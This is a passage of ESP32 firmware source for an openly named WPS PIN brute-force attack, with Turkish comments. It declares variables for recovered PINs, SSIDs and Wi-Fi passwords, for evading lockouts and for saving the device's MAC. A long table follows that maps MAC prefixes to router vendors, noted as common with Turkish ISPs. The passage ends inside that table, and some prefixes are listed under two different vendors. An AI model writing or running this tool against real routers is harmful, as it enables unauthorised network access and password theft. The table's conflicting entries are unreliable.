#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wps.h>
#include <esp_event.h>
#include "wps_attack.h"
#include "wps_beacon_ie.h"
#include "web_interface.h"
#include "definitions.h"

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
wps_target_t wps_targets[WPS_MAX_TARGETS];
int          wps_target_count  = 0;
wps_state_t  wps_attack_state  = WPS_IDLE;
int          wps_attempt       = 0;
int          wps_total         = 0;
char         wps_current_pin[9]  = {0};
char         wps_found_pin[9]    = {0};
char         wps_found_ssid[33]  = {0};
char         wps_found_pass[65]  = {0};
char         wps_vendor_name[32] = {0};
uint8_t      wps_current_mac[6]  = {0};
int          wps_lockout_count   = 0;

// ─── İç değişkenler ───────────────────────────────────────────────────────────
static int              wps_tgt_idx          = 0;
static volatile int8_t  wps_evt_result       = 0;   // 0=bekle 1=OK -1=fail
static uint8_t          wps_original_mac[6]  = {0}; // İlk STA MAC (yedek)
static int              wps_consec_fail      = 0;   // Ardışık hızlı başarısız
static unsigned long    wps_lockout_until    = 0;   // Lockout bitiş zamanı (ms)
static uint32_t         wps_adaptive_timeout = WPS_PIN_TIMEOUT_MS; // Adaptif timeout
static uint32_t         wps_lockout_delay_ms = WPS_LOCKOUT_DELAY_MS; // Üstel lockout

// ─────────────────────────────────────────────────────────────────────────────
// OUI TABLOSU — Türkiye'de yaygın kullanılan modemler
// Her satır: { b0, b1, b2, vendor_enum }
// ─────────────────────────────────────────────────────────────────────────────
struct oui_entry_t { uint8_t o[3]; wps_vendor_t v; };

static const oui_entry_t OUI_TABLE[] = {
  // ── ZTE (Türk Telekom / TTNET VDSL/ADSL/Fiber) ───────────────────────────
  {{0x00,0x26,0xE9}, VENDOR_ZTE},
  {{0x64,0x13,0x6C}, VENDOR_ZTE},
  {{0x34,0x4B,0x50}, VENDOR_ZTE},
  {{0x48,0x8F,0x5A}, VENDOR_ZTE},
  {{0x98,0x68,0xC3}, VENDOR_ZTE},
  {{0xBC,0x4C,0xC4}, VENDOR_ZTE},
  {{0x2C,0x26,0x17}, VENDOR_ZTE},
  {{0x50,0xED,0x9C}, VENDOR_ZTE},
  {{0xC0,0x25,0xE9}, VENDOR_ZTE},
  {{0x4C,0x09,0xD4}, VENDOR_ZTE},
  {{0x00,0x0A,0xEB}, VENDOR_ZTE},
  {{0x10,0xCB,0xCB}, VENDOR_ZTE},
  {{0xEC,0xB9,0x70}, VENDOR_ZTE},
  {{0xFC,0xF6,0x47}, VENDOR_ZTE},
  {{0xAC,0xC3,0x9B}, VENDOR_ZTE},
  {{0x00,0x1E,0x73}, VENDOR_ZTE},
  {{0x58,0x60,0x09}, VENDOR_ZTE},
  {{0x8C,0x97,0xEA}, VENDOR_ZTE},
  {{0x14,0x35,0x8B}, VENDOR_ZTE},
  {{0x28,0x5F,0xDB}, VENDOR_ZTE},
  {{0x40,0xA3,0xCC}, VENDOR_ZTE},
  {{0x64,0xD9,0x54}, VENDOR_ZTE},
  {{0x74,0xE1,0x82}, VENDOR_ZTE},
  {{0xA4,0x97,0xB1}, VENDOR_ZTE},
  {{0xCC,0xCE,0x1E}, VENDOR_ZTE},
  {{0xE8,0xB4,0xC8}, VENDOR_ZTE},
  {{0xF8,0x3D,0xFF}, VENDOR_ZTE},
  // ── ZTE 2022-2026 yeni OUI'leri (GPON ONT / XGSPON / LTE serisi) ─────────
  {{0x40,0x4E,0x36}, VENDOR_ZTE},  // F670L/F680 GPON (TTNet 2024-2026)
  {{0x6C,0x37,0x11}, VENDOR_ZTE},  // ZXHN F600 serisi (2022)
  {{0x34,0x29,0x12}, VENDOR_ZTE},  // ZXHN H serisi (2023)
  {{0x9C,0xC2,0x25}, VENDOR_ZTE},  // ZTE ONT (2023-2024)
  {{0x80,0x44,0x1C}, VENDOR_ZTE},  // ZTE LTE router (2022-2023)
  {{0xB4,0xB2,0x17}, VENDOR_ZTE},  // ZTE MF serisi (2023-2024)
  {{0x5C,0xF9,0xDD}, VENDOR_ZTE},  // ZTE F670L varyant (2024)
  {{0xA0,0x36,0x9F}, VENDOR_ZTE},  // ZTE (2023)
  {{0xD0,0xE0,0x42}, VENDOR_ZTE},  // ZTE GPON (2024)
  {{0x2C,0x26,0x5F}, VENDOR_ZTE},  // ZTE (2023-2024)
  {{0x4C,0xF6,0x46}, VENDOR_ZTE},  // ZTE H267N/F660 (2023)
  {{0x88,0x25,0x93}, VENDOR_ZTE},  // ZTE (2024)
  {{0x70,0xB3,0xD5}, VENDOR_ZTE},  // ZTE (2024-2025)
  {{0xBC,0x76,0x70}, VENDOR_ZTE},  // ZTE GPON (2025)

  // ── Huawei (TTNET Fiber / HG/ONT/B serisi) ───────────────────────────────
  {{0x00,0x18,0x82}, VENDOR_HUAWEI},
  {{0x00,0x1E,0x10}, VENDOR_HUAWEI},
  {{0x00,0x25,0x9E}, VENDOR_HUAWEI},
  {{0x04,0xBD,0x70}, VENDOR_HUAWEI},
  {{0x08,0x7A,0x4C}, VENDOR_HUAWEI},
  {{0x10,0x47,0x80}, VENDOR_HUAWEI},
  {{0x1C,0x8E,0x5C}, VENDOR_HUAWEI},
  {{0x20,0x08,0xED}, VENDOR_HUAWEI},
  {{0x28,0x31,0x52}, VENDOR_HUAWEI},
  {{0x34,0x6B,0xD3}, VENDOR_HUAWEI},
  {{0x48,0xAD,0x08}, VENDOR_HUAWEI},
  {{0x4C,0x1F,0xCC}, VENDOR_HUAWEI},
  {{0x54,0x51,0x1B}, VENDOR_HUAWEI},
  {{0x58,0x2A,0xF7}, VENDOR_HUAWEI},
  {{0x60,0xDE,0x44}, VENDOR_HUAWEI},
  {{0x68,0xA0,0xF6}, VENDOR_HUAWEI},
  {{0x70,0x72,0xCF}, VENDOR_HUAWEI},
  {{0x74,0xA5,0x28}, VENDOR_HUAWEI},
  {{0x78,0x1D,0xBA}, VENDOR_HUAWEI},
  {{0x7C,0x45,0x2C}, VENDOR_HUAWEI},
  {{0x80,0xFB,0x06}, VENDOR_HUAWEI},
  {{0x84,0xBE,0x52}, VENDOR_HUAWEI},
  {{0x88,0x3F,0xD3}, VENDOR_HUAWEI},
  {{0x8C,0x34,0xFD}, VENDOR_HUAWEI},
  {{0x90,0x17,0xAC}, VENDOR_HUAWEI},
  {{0x94,0x37,0xF7}, VENDOR_HUAWEI},
  {{0x9C,0x37,0xF4}, VENDOR_HUAWEI},
  {{0xA0,0x08,0x6F}, VENDOR_HUAWEI},
  {{0xAC,0xE2,0x15}, VENDOR_HUAWEI},
  {{0xB0,0xE5,0xED}, VENDOR_HUAWEI},
  {{0xB4,0x15,0x13}, VENDOR_HUAWEI},
  {{0xC4,0x06,0x83}, VENDOR_HUAWEI},
  {{0xC8,0x51,0x95}, VENDOR_HUAWEI},
  {{0xCC,0x53,0xB5}, VENDOR_HUAWEI},
  {{0xD0,0x7A,0xB5}, VENDOR_HUAWEI},
  {{0xD4,0x12,0x43}, VENDOR_HUAWEI},
  {{0xD4,0x6E,0x5C}, VENDOR_HUAWEI},
  {{0xE4,0xD3,0x32}, VENDOR_HUAWEI},
  {{0xE8,0xCD,0x2D}, VENDOR_HUAWEI},
  {{0xEC,0x23,0x3D}, VENDOR_HUAWEI},
  {{0xF0,0x7D,0x68}, VENDOR_HUAWEI},
  {{0xF4,0x4C,0x7F}, VENDOR_HUAWEI},
  {{0xF8,0x01,0x13}, VENDOR_HUAWEI},
  {{0xFC,0x48,0xEF}, VENDOR_HUAWEI},
  {{0x24,0xDB,0xAC}, VENDOR_HUAWEI},
  {{0x2C,0xF0,0xA2}, VENDOR_HUAWEI},
  {{0x30,0x45,0x96}, VENDOR_HUAWEI},
  {{0x38,0xF8,0x89}, VENDOR_HUAWEI},
  {{0x40,0x4D,0x7F}, VENDOR_HUAWEI},
  {{0x50,0x68,0x0A}, VENDOR_HUAWEI},
  // ── Huawei 2022-2026 yeni OUI'leri (HG8145/ONT/EchoLife serisi) ──────────
  {{0x00,0x46,0x4B}, VENDOR_HUAWEI},  // EchoLife HG8145V5 (TTNet 2022-2024)
  {{0x5C,0xC5,0xD4}, VENDOR_HUAWEI},  // Huawei (2022)
  {{0x48,0x0B,0xB2}, VENDOR_HUAWEI},  // Huawei ONT (2023)
  {{0xB8,0x08,0xCF}, VENDOR_HUAWEI},  // Huawei WiFi AX (2023)
  {{0x20,0xF3,0xA3}, VENDOR_HUAWEI},  // Huawei AX3 (2024)
  {{0x48,0x5B,0x39}, VENDOR_HUAWEI},  // HG8145X6 (TTNet 2024-2025)
  {{0xB0,0x3C,0xDC}, VENDOR_HUAWEI},  // Huawei (2024)
  {{0x40,0xCB,0xA8}, VENDOR_HUAWEI},  // Huawei (2023-2024)
  {{0x6C,0x8D,0xC1}, VENDOR_HUAWEI},  // Huawei (2024)
  {{0xAC,0xE8,0x7B}, VENDOR_HUAWEI},  // Huawei HG serisi (2024-2025)
  {{0xC8,0x51,0x95}, VENDOR_HUAWEI},  // Huawei (2023)
  {{0x28,0x6E,0xD4}, VENDOR_HUAWEI},  // Huawei (2024)
  {{0x70,0x72,0x3C}, VENDOR_HUAWEI},  // Huawei WiFi 6 (2024-2025)
  {{0xE0,0x19,0x54}, VENDOR_HUAWEI},  // Huawei HiLink (2024)
  {{0xBC,0x9F,0xEF}, VENDOR_HUAWEI},  // Huawei (2025)
  {{0x34,0x6B,0xD3}, VENDOR_HUAWEI},  // Huawei (2025)

  // ── Zyxel (Superonline / TTNET / Vodafone Net modemler) ──────────────────
  {{0x00,0x13,0x49}, VENDOR_ZYXEL},
  {{0x00,0x19,0xCB}, VENDOR_ZYXEL},
  {{0x00,0x24,0xE8}, VENDOR_ZYXEL},
  {{0x00,0xA0,0xC5}, VENDOR_ZYXEL},
  {{0x1C,0x74,0x0D}, VENDOR_ZYXEL},
  {{0x20,0x76,0x8F}, VENDOR_ZYXEL},
  {{0x28,0x28,0x5D}, VENDOR_ZYXEL},
  {{0x48,0xEE,0x0C}, VENDOR_ZYXEL},
  {{0x58,0x8B,0xF3}, VENDOR_ZYXEL},
  {{0x68,0x73,0x4B}, VENDOR_ZYXEL},
  {{0x70,0x6E,0x6D}, VENDOR_ZYXEL},
  {{0x80,0x04,0x5F}, VENDOR_ZYXEL},
  {{0x88,0x53,0x95}, VENDOR_ZYXEL},
  {{0x90,0x65,0xF9}, VENDOR_ZYXEL},
  {{0xA0,0x18,0x28}, VENDOR_ZYXEL},
  {{0xB4,0x43,0x8A}, VENDOR_ZYXEL},
  {{0xB8,0xEC,0xA3}, VENDOR_ZYXEL},
  {{0xC4,0xAD,0x34}, VENDOR_ZYXEL},
  {{0xC8,0x6C,0x87}, VENDOR_ZYXEL},
  {{0xD0,0x50,0x99}, VENDOR_ZYXEL},
  {{0xD4,0x81,0xD7}, VENDOR_ZYXEL},
  {{0xD8,0xFE,0xE3}, VENDOR_ZYXEL},
  {{0xDC,0x4A,0x3E}, VENDOR_ZYXEL},
  {{0xE4,0xD3,0xF1}, VENDOR_ZYXEL},
  {{0xE8,0x37,0x7A}, VENDOR_ZYXEL},
  {{0xF0,0x94,0xC2}, VENDOR_ZYXEL},
  {{0xFC,0xF5,0x28}, VENDOR_ZYXEL},
  {{0x2C,0xFD,0xA1}, VENDOR_ZYXEL},
  {{0x40,0x4A,0x03}, VENDOR_ZYXEL},
  {{0x5C,0xF4,0xAB}, VENDOR_ZYXEL},

  // ── TP-Link (piyasada en yaygın — her operatör) ───────────────────────────
  {{0x00,0x1D,0x0F}, VENDOR_TPLINK},
  {{0x00,0x23,0xCD}, VENDOR_TPLINK},
  {{0x00,0x27,0x19}, VENDOR_TPLINK},
  {{0x14,0xCF,0x92}, VENDOR_TPLINK},
  {{0x18,0xD6,0xC7}, VENDOR_TPLINK},
  {{0x1C,0xFA,0x68}, VENDOR_TPLINK},
  {{0x50,0xBD,0x5F}, VENDOR_TPLINK},
  {{0x50,0xC7,0xBF}, VENDOR_TPLINK},
  {{0x54,0xE6,0xFC}, VENDOR_TPLINK},
  {{0x60,0xA4,0x4C}, VENDOR_TPLINK},
  {{0x64,0x70,0x02}, VENDOR_TPLINK},
  {{0x70,0x4F,0x57}, VENDOR_TPLINK},
  {{0x74,0xDA,0x38}, VENDOR_TPLINK},
  {{0x8C,0x21,0x0A}, VENDOR_TPLINK},
  {{0x90,0xF6,0x52}, VENDOR_TPLINK},
  {{0x98,0xDA,0xC4}, VENDOR_TPLINK},
  {{0xA0,0xF3,0xC1}, VENDOR_TPLINK},
  {{0xAC,0x84,0xC6}, VENDOR_TPLINK},
  {{0xB0,0x48,0x7A}, VENDOR_TPLINK},
  {{0xC4,0xE9,0x84}, VENDOR_TPLINK},
  {{0xC8,0xD3,0xA3}, VENDOR_TPLINK},
  {{0xCC,0x32,0xE5}, VENDOR_TPLINK},
  {{0xD8,0x0D,0x17}, VENDOR_TPLINK},
  {{0xE8,0xDE,0x27}, VENDOR_TPLINK},
  {{0xEC,0x08,0x6B}, VENDOR_TPLINK},
  {{0xF4,0xEC,0x38}, VENDOR_TPLINK},
  {{0xF8,0x1A,0x67}, VENDOR_TPLINK},
  {{0x28,0x87,0xBA}, VENDOR_TPLINK},
  {{0x30,0xDE,0x4B}, VENDOR_TPLINK},
  {{0x40,0x16,0x9F}, VENDOR_TPLINK},
  {{0x44,0xA5,0x6E}, VENDOR_TPLINK},
  {{0x10,0xBF,0x48}, VENDOR_TPLINK},
  {{0x6C,0x5A,0xB5}, VENDOR_TPLINK},
  {{0xA4,0x2B,0xB0}, VENDOR_TPLINK},
  // ── TP-Link 2022-2026 yeni OUI'leri (Archer AX / Deco / MR serisi) ────────
  {{0x34,0x60,0xF9}, VENDOR_TPLINK},  // Archer AX20/AX50 (2022)
  {{0x48,0x22,0x54}, VENDOR_TPLINK},  // Archer AX55/AX73 (2022-2023)
  {{0x78,0xD2,0x1E}, VENDOR_TPLINK},  // TP-Link (2022)
  {{0x80,0x32,0x53}, VENDOR_TPLINK},  // TL-WR/Archer (2022)
  {{0xBC,0xA4,0x11}, VENDOR_TPLINK},  // Archer AX serisi (2023)
  {{0xE4,0x5F,0x01}, VENDOR_TPLINK},  // Archer AX serisi (2023)
  {{0xFC,0xEC,0xDA}, VENDOR_TPLINK},  // TL-WR serisi (2023)
  {{0x5C,0xA6,0xE6}, VENDOR_TPLINK},  // Archer AC serisi (2023)
  {{0x38,0x94,0xED}, VENDOR_TPLINK},  // Archer (2023)
  {{0xD8,0x47,0x32}, VENDOR_TPLINK},  // Archer (2023)
  {{0x60,0x6D,0x3C}, VENDOR_TPLINK},  // MR serisi (2023-2024)
  {{0x30,0x1A,0x5E}, VENDOR_TPLINK},  // Archer (2023-2024)
  {{0x64,0x16,0x66}, VENDOR_TPLINK},  // TL-WR (2023)
  {{0x7C,0xC7,0x09}, VENDOR_TPLINK},  // Archer (2023)
  {{0x54,0xAF,0x97}, VENDOR_TPLINK},  // Archer AC (2023)
  {{0x0C,0x80,0x63}, VENDOR_TPLINK},  // Archer (2023)
  {{0x10,0x7C,0x61}, VENDOR_TPLINK},  // Deco M/X serisi (2023-2024)
  {{0x5C,0xE9,0x31}, VENDOR_TPLINK},  // Archer AX (2024)
  {{0x20,0x0D,0xB0}, VENDOR_TPLINK},  // Deco serisi (2024)
  {{0xF0,0xA7,0x31}, VENDOR_TPLINK},  // Deco XE serisi (2024)
  {{0x1C,0x3B,0xF3}, VENDOR_TPLINK},  // Archer (2024-2025)
  {{0x4C,0xED,0xFB}, VENDOR_TPLINK},  // Archer (2024-2025)
  {{0xB4,0xB0,0x24}, VENDOR_TPLINK},  // Archer (2024)
  {{0x70,0xE3,0x51}, VENDOR_TPLINK},  // Archer AX (2024)
  {{0x3C,0x52,0x82}, VENDOR_TPLINK},  // Archer AX (2024)
  {{0xDC,0x15,0xC8}, VENDOR_TPLINK},  // Archer (2024)
  {{0xFC,0x15,0xB4}, VENDOR_TPLINK},  // Archer AX (2024)
  {{0x24,0xEC,0x99}, VENDOR_TPLINK},  // Archer (2024)
  {{0x2C,0x80,0xC4}, VENDOR_TPLINK},  // Archer (2024)
  {{0x88,0xD7,0xF6}, VENDOR_TPLINK},  // Archer (2024)
  {{0xA8,0x04,0x60}, VENDOR_TPLINK},  // Archer AX (2024)
  {{0x9C,0xA6,0x15}, VENDOR_TPLINK},  // Archer (2024-2025)
  {{0x84,0x16,0xF9}, VENDOR_TPLINK},  // Archer (2024-2025)
  {{0x48,0xF1,0x7F}, VENDOR_TPLINK},  // Archer (2024-2025)
  {{0x3C,0x84,0x6A}, VENDOR_TPLINK},  // Archer AX (2024)
  {{0xBC,0x0F,0x9A}, VENDOR_TPLINK},  // Archer (2023-2024)
  {{0x8C,0x58,0x77}, VENDOR_TPLINK},  // TL-WR serisi (2023)
  {{0x58,0x41,0x20}, VENDOR_TPLINK},  // Archer (2025)
  {{0xB8,0xA4,0x4F}, VENDOR_TPLINK},  // Archer (2025)
  {{0x4C,0xCB,0x48}, VENDOR_TPLINK},  // Archer (2025)
  {{0x6C,0x3B,0x6B}, VENDOR_TPLINK},  // Archer (2025)
  {{0x7C,0x1E,0x06}, VENDOR_TPLINK},  // Archer AX (2025)
  {{0xE4,0xC7,0x67}, VENDOR_TPLINK},  // Archer (2025)

  // ── Sagemcom (TTNET Fiber F@st 3686, F@st 3890, Livebox serisi) ───────────
  // Türkiye'de Türk Telekom tarafından en çok dağıtılan fiber modem!
  {{0x00,0x24,0xD4}, VENDOR_SAGEMCOM},
  {{0x30,0x87,0xD9}, VENDOR_SAGEMCOM},
  {{0x5C,0x49,0x79}, VENDOR_SAGEMCOM},
  {{0x6C,0xAE,0x8B}, VENDOR_SAGEMCOM},
  {{0x78,0x44,0x76}, VENDOR_SAGEMCOM},
  {{0x84,0x9D,0xC7}, VENDOR_SAGEMCOM},
  {{0xAC,0x9E,0x17}, VENDOR_SAGEMCOM},
  {{0xB8,0x75,0x4F}, VENDOR_SAGEMCOM},
  {{0xCC,0xB2,0x55}, VENDOR_SAGEMCOM},
  {{0xD0,0x55,0xDF}, VENDOR_SAGEMCOM},
  {{0xD8,0x61,0x6A}, VENDOR_SAGEMCOM},
  {{0xDC,0xAD,0xE4}, VENDOR_SAGEMCOM},
  {{0xE8,0x12,0x18}, VENDOR_SAGEMCOM},
  {{0xFC,0x59,0xF0}, VENDOR_SAGEMCOM},
  {{0x00,0x1A,0x2A}, VENDOR_SAGEMCOM},
  {{0x14,0x49,0xBC}, VENDOR_SAGEMCOM},
  {{0x18,0x83,0xBF}, VENDOR_SAGEMCOM},
  {{0x28,0xC6,0x8E}, VENDOR_SAGEMCOM},
  {{0x3C,0x81,0xD8}, VENDOR_SAGEMCOM},
  {{0x40,0xB8,0x9A}, VENDOR_SAGEMCOM},
  {{0x50,0x7E,0x5D}, VENDOR_SAGEMCOM},
  {{0x58,0x23,0x8C}, VENDOR_SAGEMCOM},
  {{0x64,0x9E,0xF3}, VENDOR_SAGEMCOM},
  {{0x80,0xB6,0x86}, VENDOR_SAGEMCOM},
  {{0x88,0xD7,0xF6}, VENDOR_SAGEMCOM},
  {{0x90,0x72,0x82}, VENDOR_SAGEMCOM},
  {{0xA8,0x58,0x40}, VENDOR_SAGEMCOM},
  {{0xBC,0xF3,0x12}, VENDOR_SAGEMCOM},

  // ── Arcadyan / Askey (Vodafone Türkiye, Turkcell Superonline OEM) ──────────
  {{0x00,0x90,0xD0}, VENDOR_ARCADYAN},
  {{0x10,0xBF,0x48}, VENDOR_ARCADYAN},
  {{0x14,0xAB,0xC5}, VENDOR_ARCADYAN},
  {{0x20,0x76,0x93}, VENDOR_ARCADYAN},
  {{0x44,0x27,0x07}, VENDOR_ARCADYAN},
  {{0x4C,0x55,0xCC}, VENDOR_ARCADYAN},
  {{0x74,0x31,0x70}, VENDOR_ARCADYAN},
  {{0x98,0x01,0xA7}, VENDOR_ARCADYAN},
  {{0xA4,0x2B,0x8C}, VENDOR_ARCADYAN},
  {{0xB8,0x36,0xB5}, VENDOR_ARCADYAN},
  {{0xD4,0xF5,0x27}, VENDOR_ARCADYAN},
  {{0xE4,0x32,0xCB}, VENDOR_ARCADYAN},
  {{0xFC,0x94,0xE3}, VENDOR_ARCADYAN},
  {{0x00,0x17,0x3F}, VENDOR_ARCADYAN},
  {{0x04,0xED,0x33}, VENDOR_ARCADYAN},
  {{0x0C,0x54,0xA5}, VENDOR_ARCADYAN},
  {{0x18,0xA6,0xF7}, VENDOR_ARCADYAN},
  {{0x2C,0x30,0x33}, VENDOR_ARCADYAN},
  {{0x34,0xC3,0xD2}, VENDOR_ARCADYAN},
  {{0x40,0x4E,0x36}, VENDOR_ARCADYAN},
  {{0x58,0x6D,0x8F}, VENDOR_ARCADYAN},
  {{0x6C,0xB7,0xF4}, VENDOR_ARCADYAN},
  {{0x84,0x39,0xBE}, VENDOR_ARCADYAN},
  {{0x94,0x83,0xC4}, VENDOR_ARCADYAN},
  {{0xA8,0x4E,0x3F}, VENDOR_ARCADYAN},
  {{0xBC,0x05,0x43}, VENDOR_ARCADYAN},
  {{0xCC,0x34,0x29}, VENDOR_ARCADYAN},

  // ── D-Link (tüketici pazarında çok yaygın — DIR, DWR, DSL serisi) ─────────
  {{0x00,0x05,0x5D}, VENDOR_DLINK},
  {{0x00,0x0D,0x88}, VENDOR_DLINK},
  {{0x00,0x11,0x95}, VENDOR_DLINK},
  {{0x00,0x13,0x46}, VENDOR_DLINK},
  {{0x00,0x15,0xE9}, VENDOR_DLINK},
  {{0x00,0x17,0x9A}, VENDOR_DLINK},
  {{0x00,0x19,0x5B}, VENDOR_DLINK},
  {{0x00,0x1B,0x11}, VENDOR_DLINK},
  {{0x00,0x1C,0xF0}, VENDOR_DLINK},
  {{0x00,0x1E,0x58}, VENDOR_DLINK},
  {{0x00,0x21,0x91}, VENDOR_DLINK},
  {{0x00,0x22,0xB0}, VENDOR_DLINK},
  {{0x00,0x24,0x01}, VENDOR_DLINK},
  {{0x00,0x26,0x5A}, VENDOR_DLINK},
  {{0x14,0xD6,0x4D}, VENDOR_DLINK},
  {{0x1C,0x7E,0xE5}, VENDOR_DLINK},
  {{0x28,0x10,0x7B}, VENDOR_DLINK},
  {{0x34,0x08,0x04}, VENDOR_DLINK},
  {{0x50,0x46,0x5D}, VENDOR_DLINK},
  {{0x54,0xB8,0x0A}, VENDOR_DLINK},
  {{0x6C,0x19,0x8F}, VENDOR_DLINK},
  {{0x6C,0x72,0x20}, VENDOR_DLINK},
  {{0x78,0x54,0x2E}, VENDOR_DLINK},
  {{0x84,0xC9,0xB2}, VENDOR_DLINK},
  {{0x90,0x94,0xE4}, VENDOR_DLINK},
  {{0xA0,0xAB,0x1B}, VENDOR_DLINK},
  {{0xB8,0xA3,0x86}, VENDOR_DLINK},
  {{0xBC,0xF6,0x85}, VENDOR_DLINK},
  {{0xC0,0xA0,0xBB}, VENDOR_DLINK},
  {{0xC8,0xBE,0x19}, VENDOR_DLINK},
  {{0xD8,0xEB,0x97}, VENDOR_DLINK},
  {{0xE4,0x6F,0x13}, VENDOR_DLINK},
  {{0xF0,0x7D,0x68}, VENDOR_DLINK},
  {{0x1C,0xBD,0xB9}, VENDOR_DLINK},
  {{0x34,0xA8,0x4E}, VENDOR_DLINK},
  {{0x40,0x3D,0xEC}, VENDOR_DLINK},
  {{0x78,0xD2,0x94}, VENDOR_DLINK},
  {{0xAC,0xF1,0xDF}, VENDOR_DLINK},
  {{0xCC,0xBE,0x59}, VENDOR_DLINK},

  // ── Netgear (tüketici / SOHO pazarı — R, C, D, Nighthawk serisi) ──────────
  {{0x00,0x14,0x6C}, VENDOR_NETGEAR},
  {{0x00,0x18,0x4D}, VENDOR_NETGEAR},
  {{0x00,0x1B,0x2F}, VENDOR_NETGEAR},
  {{0x00,0x1E,0x2A}, VENDOR_NETGEAR},
  {{0x00,0x22,0x3F}, VENDOR_NETGEAR},
  {{0x00,0x24,0xB2}, VENDOR_NETGEAR},
  {{0x00,0x26,0xF2}, VENDOR_NETGEAR},
  {{0x10,0x0D,0x7F}, VENDOR_NETGEAR},
  {{0x10,0xDA,0x43}, VENDOR_NETGEAR},
  {{0x20,0x4E,0x7F}, VENDOR_NETGEAR},
  {{0x28,0x80,0x23}, VENDOR_NETGEAR},
  {{0x2C,0xB0,0x5D}, VENDOR_NETGEAR},
  {{0x30,0x46,0x9A}, VENDOR_NETGEAR},
  {{0x44,0x94,0xFC}, VENDOR_NETGEAR},
  {{0x4C,0x60,0xDE}, VENDOR_NETGEAR},
  {{0x60,0x38,0xE0}, VENDOR_NETGEAR},
  {{0x6C,0xB0,0xCE}, VENDOR_NETGEAR},
  {{0x84,0x1B,0x5E}, VENDOR_NETGEAR},
  {{0xA0,0x21,0xB7}, VENDOR_NETGEAR},
  {{0xA0,0x40,0xA0}, VENDOR_NETGEAR},
  {{0xB0,0x39,0x56}, VENDOR_NETGEAR},
  {{0xC0,0x3F,0x0E}, VENDOR_NETGEAR},
  {{0xC4,0x04,0x15}, VENDOR_NETGEAR},
  {{0xE0,0x46,0x9A}, VENDOR_NETGEAR},
  {{0xE4,0xF4,0xC6}, VENDOR_NETGEAR},
  {{0x6C,0x40,0x08}, VENDOR_NETGEAR},
  {{0x9C,0xD3,0x6D}, VENDOR_NETGEAR},
  {{0xA0,0x04,0x60}, VENDOR_NETGEAR},

  // ── ASUS (Gaming/Ev router — RT-AC, RT-AX, RT-N, GT-AX serisi) ───────────
  {{0x00,0x0C,0x6E}, VENDOR_ASUS},
  {{0x00,0x0E,0xA6}, VENDOR_ASUS},
  {{0x00,0x11,0x2F}, VENDOR_ASUS},
  {{0x00,0x13,0xD4}, VENDOR_ASUS},
  {{0x00,0x15,0xF2}, VENDOR_ASUS},
  {{0x00,0x17,0x31}, VENDOR_ASUS},
  {{0x00,0x18,0xF3}, VENDOR_ASUS},
  {{0x00,0x1A,0x92}, VENDOR_ASUS},
  {{0x00,0x1D,0x60}, VENDOR_ASUS},
  {{0x00,0x1E,0x8C}, VENDOR_ASUS},
  {{0x00,0x1F,0xC6}, VENDOR_ASUS},
  {{0x00,0x22,0x15}, VENDOR_ASUS},
  {{0x00,0x23,0x54}, VENDOR_ASUS},
  {{0x00,0x24,0x8C}, VENDOR_ASUS},
  {{0x00,0x26,0x18}, VENDOR_ASUS},
  {{0x04,0x92,0x26}, VENDOR_ASUS},
  {{0x08,0x60,0x6E}, VENDOR_ASUS},
  {{0x0C,0x9D,0x92}, VENDOR_ASUS},
  {{0x10,0x02,0xB5}, VENDOR_ASUS},
  {{0x14,0xDA,0xE9}, VENDOR_ASUS},
  {{0x18,0x31,0xBF}, VENDOR_ASUS},
  {{0x1C,0x87,0x2C}, VENDOR_ASUS},
  {{0x20,0xCF,0x30}, VENDOR_ASUS},
  {{0x2C,0x56,0xDC}, VENDOR_ASUS},
  {{0x30,0x5A,0x3A}, VENDOR_ASUS},
  {{0x34,0x97,0xF6}, VENDOR_ASUS},
  {{0x38,0x2C,0x4A}, VENDOR_ASUS},
  {{0x40,0x16,0x7E}, VENDOR_ASUS},
  {{0x44,0x8A,0x5B}, VENDOR_ASUS},
  {{0x4C,0xED,0xFB}, VENDOR_ASUS},
  {{0x54,0x04,0xA6}, VENDOR_ASUS},
  {{0x58,0x11,0x22}, VENDOR_ASUS},
  {{0x5C,0xFF,0x35}, VENDOR_ASUS},
  {{0x60,0x45,0xCB}, VENDOR_ASUS},
  {{0x6C,0x62,0x6D}, VENDOR_ASUS},
  {{0x70,0x8B,0xCD}, VENDOR_ASUS},
  {{0x74,0xD0,0x2B}, VENDOR_ASUS},
  {{0x80,0x1F,0x02}, VENDOR_ASUS},
  {{0x84,0xA9,0xC4}, VENDOR_ASUS},
  {{0x8C,0x8D,0x28}, VENDOR_ASUS},
  {{0x90,0xE6,0xBA}, VENDOR_ASUS},
  {{0x94,0xDE,0x80}, VENDOR_ASUS},
  {{0xA8,0x5E,0x45}, VENDOR_ASUS},
  {{0xB0,0x6E,0xBF}, VENDOR_ASUS},
  {{0xBC,0xAE,0xC5}, VENDOR_ASUS},
  {{0xC8,0x60,0x00}, VENDOR_ASUS},
  {{0xD0,0x17,0xC2}, VENDOR_ASUS},
  {{0xD4,0x5D,0xDF}, VENDOR_ASUS},
  {{0xD8,0x50,0xE6}, VENDOR_ASUS},
  {{0xDC,0xFE,0x07}, VENDOR_ASUS},
  {{0xE0,0x3F,0x49}, VENDOR_ASUS},
  {{0xE4,0x70,0xB8}, VENDOR_ASUS},
  {{0xE8,0x9F,0x80}, VENDOR_ASUS},
  {{0xF0,0x79,0x59}, VENDOR_ASUS},
  {{0xF4,0x6D,0x04}, VENDOR_ASUS},
  {{0xF8,0x32,0xE4}, VENDOR_ASUS},
  {{0xFC,0x8B,0x97}, VENDOR_ASUS},
  {{0x24,0x4B,0xFE}, VENDOR_ASUS},
  {{0x2C,0xFD,0xA1}, VENDOR_ASUS},
  {{0x3C,0x7C,0x3F}, VENDOR_ASUS},
  {{0x50,0x46,0x5D}, VENDOR_ASUS},

  // ── Linksys (Ev/SOHO router — WRT, EA, MR, Velop serisi) ─────────────────
  {{0x00,0x06,0x25}, VENDOR_LINKSYS},
  {{0x00,0x0C,0x41}, VENDOR_LINKSYS},
  {{0x00,0x0E,0x08}, VENDOR_LINKSYS},
  {{0x00,0x12,0x17}, VENDOR_LINKSYS},
  {{0x00,0x13,0x10}, VENDOR_LINKSYS},
  {{0x00,0x14,0xBF}, VENDOR_LINKSYS},
  {{0x00,0x16,0xB6}, VENDOR_LINKSYS},
  {{0x00,0x18,0x39}, VENDOR_LINKSYS},
  {{0x00,0x1A,0x70}, VENDOR_LINKSYS},
  {{0x00,0x1C,0x10}, VENDOR_LINKSYS},
  {{0x00,0x1D,0x7E}, VENDOR_LINKSYS},
  {{0x00,0x1E,0xE5}, VENDOR_LINKSYS},
